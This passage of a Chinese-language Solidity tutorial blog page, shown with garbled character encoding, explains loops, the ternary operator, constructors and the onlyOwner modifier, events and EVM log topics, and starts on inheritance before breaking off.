class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function whileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    while(i &lt; 10)&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>do-whileå¾ªç¯</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function doWhileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    do&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;while(i &lt; 10);</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>ä¸‰ç›®è¿ç®—</li></ol><p>ä¸‰å…ƒè¿ç®—ç¬¦æ˜¯<code>Solidity</code>ä¸­å”¯ä¸€ä¸€ä¸ªæ¥å—ä¸‰ä¸ªæ“ä½œæ•°çš„è¿ç®—ç¬¦ï¼Œè§„åˆ™<code>æ¡ä»¶? æ¡ä»¶ä¸ºçœŸçš„è¡¨è¾¾å¼:æ¡ä»¶ä¸ºå‡çš„è¡¨è¾¾å¼</code>ã€‚æ­¤è¿ç®—ç¬¦ç»å¸¸ç”¨ä½œ<code>if</code>è¯­å¥çš„å¿«æ·æ–¹å¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// ä¸‰å…ƒè¿ç®—ç¬¦ ternary/conditional operator</span><br><span class="line">function ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;</span><br><span class="line">    // return the max of x and y</span><br><span class="line">    return x &gt;= y ? x: y; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¦å¤–è¿˜æœ‰<code>continue</code>ï¼ˆç«‹å³è¿›å…¥ä¸‹ä¸€ä¸ªå¾ªç¯ï¼‰å’Œ<code>break</code>ï¼ˆè·³å‡ºå½“å‰å¾ªç¯ï¼‰å…³é”®å­—å¯ä»¥ä½¿ç”¨ã€‚</strong></p><h2 id="æ„é€ å‡½æ•°å’Œä¿®é¥°å™¨">æ„é€ å‡½æ•°å’Œä¿®é¥°å™¨</h2><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬å°†ç”¨åˆçº¦æƒé™æ§åˆ¶ï¼ˆ<code>Ownable</code>ï¼‰çš„ä¾‹å­ä»‹ç»<code>Solidity</code>è¯­è¨€ä¸­æ„é€ å‡½æ•°ï¼ˆ<code>constructor</code>ï¼‰å’Œç‹¬æœ‰çš„ä¿®é¥°å™¨ï¼ˆ<code>modifier</code>ï¼‰ã€‚æµ‹è¯•ä»£ç <code>Owner.sol</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Owner &#123;</span><br><span class="line">    //å®šä¹‰ownerå˜é‡</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    //æ„é€ å‡½æ•°</span><br><span class="line">    constructor(address initialOwner)&#123;</span><br><span class="line">        //åœ¨éƒ¨ç½²åˆçº¦æ—¶ï¼Œå°†ownerè®¾ç½®ä¸ºinitialOwner</span><br><span class="line">        owner = initialOwner;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        //æ£€æŸ¥åœ°å€æ˜¯å¦ä¸ºowner</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        //å¦‚æœæ˜¯çš„è¯ï¼Œç»§ç»­è¿è¡Œå‡½æ•°ä¸»ä½“ï¼Œå¦åˆ™æŠ¥é”™å¹¶revertäº¤æ˜“</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    //</span><br><span class="line">    function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">        //åªæœ‰ownerèƒ½è¿è¡Œè¿™ä¸ªå‡½æ•°</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ„é€ å‡½æ•°">æ„é€ å‡½æ•°</h3><p>æ„é€ å‡½æ•°ï¼ˆ<code>constructor</code>ï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œæ¯ä¸ªåˆçº¦å¯ä»¥å®šä¹‰ä¸€ä¸ªï¼Œå¹¶åœ¨éƒ¨ç½²åˆçº¦çš„æ—¶å€™è‡ªåŠ¨è¿è¡Œä¸€æ¬¡ã€‚å®ƒå¯ä»¥ç”¨æ¥åˆå§‹åŒ–åˆçº¦çš„ä¸€äº›å‚æ•°ï¼Œä¾‹å¦‚åˆå§‹åŒ–åˆçº¦çš„<code>owner</code>åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address owner; // å®šä¹‰ownerå˜é‡</span><br><span class="line">// æ„é€ å‡½æ•°</span><br><span class="line">constructor(address initialOwner) &#123;</span><br><span class="line">    owner = initialOwner; // åœ¨éƒ¨ç½²åˆçº¦çš„æ—¶å€™ï¼Œå°†ownerè®¾ç½®ä¸ºä¼ å…¥çš„initialOwneråœ°å€</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šæ„é€ å‡½æ•°åœ¨ä¸åŒçš„Solidityç‰ˆæœ¬ä¸­çš„è¯­æ³•å¹¶ä¸ä¸€è‡´ï¼Œåœ¨<strong>Solidity 0.4.22ä¹‹å‰</strong>ï¼Œæ„é€ å‡½æ•°ä¸ä½¿ç”¨ <code>constructor</code> è€Œæ˜¯ä½¿ç”¨ä¸åˆçº¦ååŒåçš„å‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°è€Œä½¿ç”¨ï¼Œç”±äºè¿™ç§æ—§å†™æ³•å®¹æ˜“ä½¿å¼€å‘è€…åœ¨ä¹¦å†™æ—¶å‘ç”Ÿç–æ¼ï¼ˆä¾‹å¦‚åˆçº¦åå« <code>Parents</code>ï¼Œæ„é€ å‡½æ•°åå†™æˆ <code>parents</code>ï¼‰ï¼Œä½¿å¾—æ„é€ å‡½æ•°å˜æˆæ™®é€šå‡½æ•°ï¼Œå¼•å‘æ¼æ´ï¼Œæ‰€ä»¥0.4.22ç‰ˆæœ¬åŠä¹‹åï¼Œé‡‡ç”¨äº†å…¨æ–°çš„ <code>constructor</code> å†™æ³•ã€‚</p><p>æ„é€ å‡½æ•°çš„æ—§å†™æ³•ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity =0.4.21;</span><br><span class="line">contract Parents &#123;</span><br><span class="line">    // ä¸åˆçº¦åParentsåŒåçš„å‡½æ•°å°±æ˜¯æ„é€ å‡½æ•°</span><br><span class="line">    function Parents () public &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¿®é¥°å™¨">ä¿®é¥°å™¨</h3><p>ä¿®é¥°å™¨ï¼ˆ<code>modifier</code>ï¼‰æ˜¯<code>Solidity</code>ç‰¹æœ‰çš„è¯­æ³•ï¼Œç±»ä¼¼äºé¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­çš„è£…é¥°å™¨ï¼ˆ<code>decorator</code>ï¼‰ï¼Œå£°æ˜å‡½æ•°æ‹¥æœ‰çš„ç‰¹æ€§ï¼Œå¹¶å‡å°‘ä»£ç å†—ä½™ã€‚å®ƒå°±åƒé’¢é“ä¾ çš„æ™ºèƒ½ç›”ç”²ï¼Œç©¿ä¸Šå®ƒçš„å‡½æ•°ä¼šå¸¦æœ‰æŸäº›ç‰¹å®šçš„è¡Œä¸ºã€‚<code>modifier</code>çš„ä¸»è¦ä½¿ç”¨åœºæ™¯æ˜¯è¿è¡Œå‡½æ•°å‰çš„æ£€æŸ¥ï¼Œä¾‹å¦‚åœ°å€ï¼Œå˜é‡ï¼Œä½™é¢ç­‰ã€‚</p><p>æˆ‘ä»¬æ¥å®šä¹‰ä¸€ä¸ªå«åšonlyOwnerçš„modifierï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyOwner&#123;</span><br><span class="line">        //æ£€æŸ¥åœ°å€æ˜¯å¦ä¸ºowner</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        //å¦‚æœæ˜¯çš„è¯ï¼Œç»§ç»­è¿è¡Œå‡½æ•°ä¸»ä½“ï¼Œå¦åˆ™æŠ¥é”™å¹¶revertäº¤æ˜“</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¸¦æœ‰<code>onlyOwner</code>ä¿®é¥°ç¬¦çš„å‡½æ•°åªèƒ½è¢«<code>owner</code>åœ°å€è°ƒç”¨ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//å®šä¹‰ä¸€ä¸ªå¸¦æœ‰onlyOwnerä¿®é¥°ç¬¦çš„å‡½æ•°</span><br><span class="line">    function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">        //åªæœ‰ownerèƒ½è¿è¡Œè¿™ä¸ªå‡½æ•°ï¼Œå¹¶æ”¹å˜owner</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª<code>changeOwner</code>å‡½æ•°ï¼Œè¿è¡Œå®ƒå¯ä»¥æ”¹å˜åˆçº¦çš„<code>owner</code>ï¼Œä½†æ˜¯ç”±äº<code>onlyOwner</code>ä¿®é¥°ç¬¦çš„å­˜åœ¨ï¼Œåªæœ‰åŸå…ˆçš„<code>owner</code>å¯ä»¥è°ƒç”¨ï¼Œåˆ«äººè°ƒç”¨å°±ä¼šæŠ¥é”™ã€‚è¿™ä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ§åˆ¶æ™ºèƒ½åˆçº¦æƒé™çš„æ–¹æ³•ã€‚</p><h3 id="è¿è¡Œæµ‹è¯•">è¿è¡Œæµ‹è¯•</h3><p>é¦–å…ˆæ˜¯éƒ¨ç½²ä»£ç ï¼Œä¼ é€’ä¸€ä¸ªéœ€è¦åˆå§‹åŒ–çš„<code>owner</code>ï¼Œåˆå§‹åŒ–<code>owner</code>ä¸º<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150027700.png" alt="image-20250126150027700"></p><p>ä½¿ç”¨å¦ä¸€ä¸ªç”¨æˆ·<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>ï¼Œå»è°ƒç”¨åˆçº¦ï¼Œå¹¶å°è¯•ä¿®æ”¹<code>owner</code>ã€‚<code>owner</code>ä¿®æ”¹å¤±è´¥ï¼</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150311002.png" alt="image-20250126150311002"></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150255810.png" alt="image-20250126150255810"></p><p>å°è¯•ä½¿ç”¨éƒ¨ç½²æ—¶è¾“å…¥çš„è´¦æˆ·``0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`ã€‚</p><p>å»æ”¹å˜<code>owner</code>ä¸º<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>ï¼Œ<code>owner</code>ä¿®æ”¹æˆåŠŸï¼</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150540552.png" alt="image-20250126150540552"></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150740601.png" alt="image-20250126150740601"></p><h2 id="äº‹ä»¶">äº‹ä»¶</h2><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬ç”¨è½¬è´¦ERC20ä»£å¸ä¸ºä¾‹æ¥ä»‹ç»<code>Solidity</code>ä¸­çš„äº‹ä»¶ï¼ˆ<code>event</code>ï¼‰ã€‚</p><p>æµ‹è¯•ä»£ç <code>Events.sol</code>,ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Events&#123;</span><br><span class="line">    //å®šä¹‰_balancesæ˜ å°„å˜é‡ï¼Œè®°å½•æ¯ä¸ªåœ°å€çš„æ¯”ç‰¹å¸æ•°é‡</span><br><span class="line">    mapping(address =&gt; uint256) public _balances;</span><br><span class="line"></span><br><span class="line">    //å®šä¹‰Transfer eventï¼Œè®°å½•transferäº¤æ˜“çš„è½¬è´¦åœ°å€ï¼Œæ¥æ”¶åœ°å€å’Œè½¬è´¦æ•°é‡ã€‚</span><br><span class="line">    event Transfer(address indexed from,address indexed to,uint256 value);</span><br><span class="line"></span><br><span class="line">    //å®šä¹‰_transferå‡½æ•°ï¼Œæ‰§è¡Œè½¬è´¦é€»è¾‘</span><br><span class="line">    function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external &#123;</span><br><span class="line">        //ç»™è½¬è´¦åœ°å€ä¸€äº›åˆå§‹ä»£å¸</span><br><span class="line">        _balances[from] = 10000000;</span><br><span class="line"></span><br><span class="line">        //fromåœ°å€å‡å»è½¬è´¦æ•°é‡</span><br><span class="line">        _balances[from] -= amount;</span><br><span class="line">        //toåœ°å€åŠ ä¸Šè½¬è´¦æ•°é‡</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line"></span><br><span class="line">        //é‡Šæ”¾äº‹ä»¶</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äº‹ä»¶-2">äº‹ä»¶</h3><p><code>Solidity</code>ä¸­çš„äº‹ä»¶ï¼ˆ<code>event</code>ï¼‰æ˜¯<code>EVM</code>ä¸Šæ—¥å¿—çš„æŠ½è±¡ï¼Œå®ƒå…·æœ‰ä¸¤ä¸ªç‰¹ç‚¹ï¼š</p><ul><li>å“åº”ï¼šåº”ç”¨ç¨‹åºï¼ˆ<a href="https://learnblockchain.cn/docs/ethers.js/api-contract.html#id18"><code>ethers.js</code></a>ï¼‰å¯ä»¥é€šè¿‡<code>RPC</code>æ¥å£è®¢é˜…å’Œç›‘å¬è¿™äº›äº‹ä»¶ï¼Œå¹¶åœ¨å‰ç«¯åšå“åº”ã€‚</li><li>ç»æµï¼šäº‹ä»¶æ˜¯<code>EVM</code>ä¸Šæ¯”è¾ƒç»æµçš„å­˜å‚¨æ•°æ®çš„æ–¹å¼ï¼Œæ¯ä¸ªå¤§æ¦‚æ¶ˆè€—2,000 <code>gas</code>ï¼›ç›¸æ¯”ä¹‹ä¸‹ï¼Œé“¾ä¸Šå­˜å‚¨ä¸€ä¸ªæ–°å˜é‡è‡³å°‘éœ€è¦20,000 <code>gas</code>ã€‚</li></ul><h3 id="å£°æ˜äº‹ä»¶">å£°æ˜äº‹ä»¶</h3><p>äº‹ä»¶çš„å£°æ˜ç”±<code>event</code>å…³é”®å­—å¼€å¤´ï¼Œæ¥ç€æ˜¯äº‹ä»¶åç§°ï¼Œæ‹¬å·é‡Œé¢å†™å¥½äº‹ä»¶éœ€è¦è®°å½•çš„å˜é‡ç±»å‹å’Œå˜é‡åã€‚</p><p>ä»¥<code>ERC20</code>ä»£å¸åˆçº¦çš„<code>Transfer</code>äº‹ä»¶ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>Transfer</code>äº‹ä»¶å…±è®°å½•äº†3ä¸ªå˜é‡<code>from</code>ï¼Œ<code>to</code>å’Œ<code>value</code>ï¼Œåˆ†åˆ«å¯¹åº”ä»£å¸çš„è½¬è´¦åœ°å€ï¼Œæ¥æ”¶åœ°å€å’Œè½¬è´¦æ•°é‡ï¼Œå…¶ä¸­<code>from</code>å’Œ<code>to</code>å‰é¢å¸¦æœ‰<code>indexed</code>å…³é”®å­—ï¼Œä»–ä»¬ä¼šä¿å­˜åœ¨ä»¥å¤ªåŠè™šæ‹Ÿæœºæ—¥å¿—çš„<code>topics</code>ä¸­ï¼Œæ–¹ä¾¿ä¹‹åæ£€ç´¢ã€‚</p><h3 id="é‡Šæ”¾äº‹ä»¶">é‡Šæ”¾äº‹ä»¶</h3><p>æˆ‘ä»¬å¯ä»¥åœ¨å‡½æ•°é‡Œé‡Šæ”¾äº‹ä»¶ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæ¯æ¬¡ç”¨<code>_transfer()</code>å‡½æ•°è¿›è¡Œè½¬è´¦æ“ä½œçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡Šæ”¾<code>Transfer</code>äº‹ä»¶ï¼Œå¹¶è®°å½•ç›¸åº”çš„å˜é‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// å®šä¹‰_transferå‡½æ•°ï¼Œæ‰§è¡Œè½¬è´¦é€»è¾‘</span><br><span class="line">function _transfer(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external &#123;</span><br><span class="line"></span><br><span class="line">    _balances[from] = 10000000; // ç»™è½¬è´¦åœ°å€ä¸€äº›åˆå§‹ä»£å¸</span><br><span class="line"></span><br><span class="line">    _balances[from] -=  amount; // fromåœ°å€å‡å»è½¬è´¦æ•°é‡</span><br><span class="line">    _balances[to] += amount; // toåœ°å€åŠ ä¸Šè½¬è´¦æ•°é‡</span><br><span class="line"></span><br><span class="line">    // é‡Šæ”¾äº‹ä»¶</span><br><span class="line">    emit Transfer(from, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EVMæ—¥å¿—-Log">EVMæ—¥å¿—(Log)</h3><p>ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰ç”¨æ—¥å¿—<code>Log</code>æ¥å­˜å‚¨<code>Solidity</code>äº‹ä»¶ï¼Œæ¯æ¡æ—¥å¿—è®°å½•éƒ½åŒ…å«ä¸»é¢˜<code>topics</code>å’Œæ•°æ®<code>data</code>ä¸¤éƒ¨åˆ†ã€‚</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126183129690.png" alt="image-20250126183129690"></p><h3 id="ä¸»é¢˜-Topics">ä¸»é¢˜(Topics)</h3><p>æ—¥å¿—çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸»é¢˜æ•°ç»„ï¼Œç”¨äºæè¿°äº‹ä»¶ï¼Œé•¿åº¦ä¸èƒ½è¶…è¿‡<code>4</code>ã€‚å®ƒçš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯äº‹ä»¶çš„ç­¾åï¼ˆå“ˆå¸Œï¼‰ã€‚</p><p>å¯¹äºä¸Šé¢çš„<code>Transfer</code>äº‹ä»¶ï¼Œå®ƒçš„äº‹ä»¶å“ˆå¸Œå°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keccak256(&quot;Transfer(address,address,uint256)&quot;)</span><br><span class="line"></span><br><span class="line">//0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</span><br></pre></td></tr></table></figure><p>é™¤äº†äº‹ä»¶å“ˆå¸Œï¼Œä¸»é¢˜è¿˜å¯ä»¥åŒ…å«è‡³å¤š<code>3</code>ä¸ª<code>indexed</code>å‚æ•°ï¼Œä¹Ÿå°±æ˜¯<code>Transfer</code>äº‹ä»¶ä¸­çš„<code>from</code>å’Œ<code>to</code>ã€‚</p><p><code>indexed</code>æ ‡è®°çš„å‚æ•°å¯ä»¥ç†è§£ä¸ºæ£€ç´¢äº‹ä»¶çš„ç´¢å¼•â€œé”®â€ï¼Œæ–¹ä¾¿ä¹‹åæœç´¢ã€‚æ¯ä¸ª <code>indexed</code> å‚æ•°çš„å¤§å°ä¸ºå›ºå®šçš„256æ¯”ç‰¹ï¼Œå¦‚æœå‚æ•°å¤ªå¤§äº†ï¼ˆæ¯”å¦‚å­—ç¬¦ä¸²ï¼‰ï¼Œå°±ä¼šè‡ªåŠ¨è®¡ç®—å“ˆå¸Œå­˜å‚¨åœ¨ä¸»é¢˜ä¸­ã€‚</p><p>è¿™é‡Œå…¶å®ä¼šå¼•å…¥ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œæ ¹æ®Solidityçš„<a href="https://docs.soliditylang.org/en/v0.8.27/abi-spec.html#encoding-of-indexed-event-parameters">å®˜æ–¹æ–‡æ¡£</a>, å¯¹äºéå€¼ç±»å‹çš„å‚æ•°ï¼ˆå¦‚arrays, bytes, stringsï¼‰, Solidityä¸ä¼šç›´æ¥å­˜å‚¨ï¼Œè€Œæ˜¯ä¼šå°†<code>Keccak-256</code>å“ˆå¸Œå­˜å‚¨åœ¨ä¸»é¢˜ä¸­ï¼Œä»è€Œå¯¼è‡´æ•°æ®ä¿¡æ¯çš„ä¸¢å¤±ã€‚è¿™å¯¹äºæŸäº›ä¾èµ–äºé“¾ä¸Šäº‹ä»¶çš„DAPPï¼ˆè·¨é“¾ï¼Œç”¨æˆ·æ³¨å†Œç­‰ç­‰ï¼‰æ¥è¯´ï¼Œå¯èƒ½ä¼šå¯¼è‡´äº‹ä»¶æ£€ç´¢å›°éš¾ï¼Œéœ€è¦è§£æå“ˆå¸Œå€¼ã€‚</p><h3 id="æ•°æ®-Data">æ•°æ®(Data)</h3><p>äº‹ä»¶ä¸­ä¸å¸¦ <code>indexed</code>çš„å‚æ•°ä¼šè¢«å­˜å‚¨åœ¨ <code>data</code> éƒ¨åˆ†ä¸­ï¼Œå¯ä»¥ç†è§£ä¸ºäº‹ä»¶çš„&quot;å€¼&quot;ã€‚<code>data</code> éƒ¨åˆ†çš„å˜é‡ä¸èƒ½è¢«ç›´æ¥æ£€ç´¢ï¼Œä½†å¯ä»¥å­˜å‚¨ä»»æ„å¤§å°çš„æ•°æ®ã€‚å› æ­¤ä¸€èˆ¬ <code>data</code> éƒ¨åˆ†å¯ä»¥ç”¨æ¥å­˜å‚¨å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œä¾‹å¦‚æ•°ç»„å’Œå­—ç¬¦ä¸²ç­‰ç­‰ï¼Œå› ä¸ºè¿™äº›æ•°æ®è¶…è¿‡äº†256æ¯”ç‰¹ï¼Œå³ä½¿å­˜å‚¨åœ¨äº‹ä»¶çš„ <code>topics</code> éƒ¨åˆ†ä¸­ï¼Œä¹Ÿæ˜¯ä»¥å“ˆå¸Œçš„æ–¹å¼å­˜å‚¨ã€‚å¦å¤–ï¼Œ<code>data</code> éƒ¨åˆ†çš„å˜é‡åœ¨å­˜å‚¨ä¸Šæ¶ˆè€—çš„gasç›¸æ¯”äº <code>topics</code> æ›´å°‘ã€‚</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126185114449.png" alt="image-20250126185114449"></p><p><code>Topics</code>é‡Œé¢æœ‰ä¸‰ä¸ªå…ƒç´ ï¼Œç¬¬ä¸€ä¸ªæ˜¯è¿™ä¸ªäº‹ä»¶çš„å“ˆå¸Œï¼Œç¬¬äºŒå’Œä¸‰æ˜¯æˆ‘ä»¬å®šä¹‰çš„ä¸¤ä¸ª<code>indexed</code>å˜é‡çš„ä¿¡æ¯ï¼Œå³è½¬è´¦çš„è½¬å‡ºåœ°å€å’Œæ¥æ”¶åœ°å€ã€‚<code>Data</code>é‡Œé¢æ˜¯å‰©ä¸‹çš„ä¸å¸¦<code>indexed</code>çš„å˜é‡ï¼Œä¹Ÿå°±æ˜¯è½¬è´¦æ•°é‡ã€‚å¯ä»¥åœ¨ä¸Šå›¾çœ‹åˆ°<code>Data</code>éƒ¨åˆ†ä¸º<code>0x32</code>ï¼Œ50çš„16è¿›åˆ¶ã€‚</p><h2 id="ç»§æ‰¿">ç»§æ‰¿</h2><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬ä»‹ç»<code>Solidity</code>ä¸­çš„ç»§æ‰¿ï¼ˆ<code>inheritance</code>ï¼‰ï¼ŒåŒ…æ‹¬ç®€å•ç»§æ‰¿ï¼Œå¤šé‡ç»§æ‰¿ï¼Œä»¥åŠä¿®é¥°å™¨ï¼ˆ<code>Modifier</code>ï¼‰å’Œæ„é€ å‡½æ•°ï¼ˆ<code>Constructor</code>ï¼‰çš„ç»§æ‰¿ã€‚</p><h3 id="ç»§æ‰¿-2">ç»§æ‰¿</h3><p>ç»§æ‰¿æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹å¾ˆé‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯ä»¥æ˜¾è‘—å‡å°‘é‡å¤ä»£ç ã€‚å¦‚æœæŠŠåˆçº¦çœ‹ä½œæ˜¯å¯¹è±¡çš„è¯ï¼Œ<code>Solidity</code>ä¹Ÿæ˜¯é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ï¼Œä¹Ÿæ”¯æŒç»§æ‰¿ã€‚</p><h3 id="è§„åˆ™">è§„åˆ™</h3><ul><li><code>virtual</code>: çˆ¶åˆçº¦ä¸­çš„å‡½æ•°ï¼Œå¦‚æœ<strong>å¸Œæœ›å­åˆçº¦é‡å†™ï¼Œéœ€è¦åŠ ä¸Š<code>virtual</code>å…³é”®å­—ã€‚</strong></li><li><code>override</code>ï¼š<strong>å­åˆçº¦é‡å†™äº†çˆ¶åˆçº¦ä¸­çš„å‡½æ•°ï¼Œéœ€è¦åŠ ä¸Š<code>override</code>å…³é”®å­—</strong>ã€‚</li></ul><p><strong>æ³¨æ„</strong>ï¼šç”¨<code>override</code>ä¿®é¥°<code>public</code>å˜é‡ï¼Œä¼šé‡å†™ä¸å˜é‡åŒåçš„<code>getter</code>å‡½æ•°ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping(address =&gt; uint256) public override 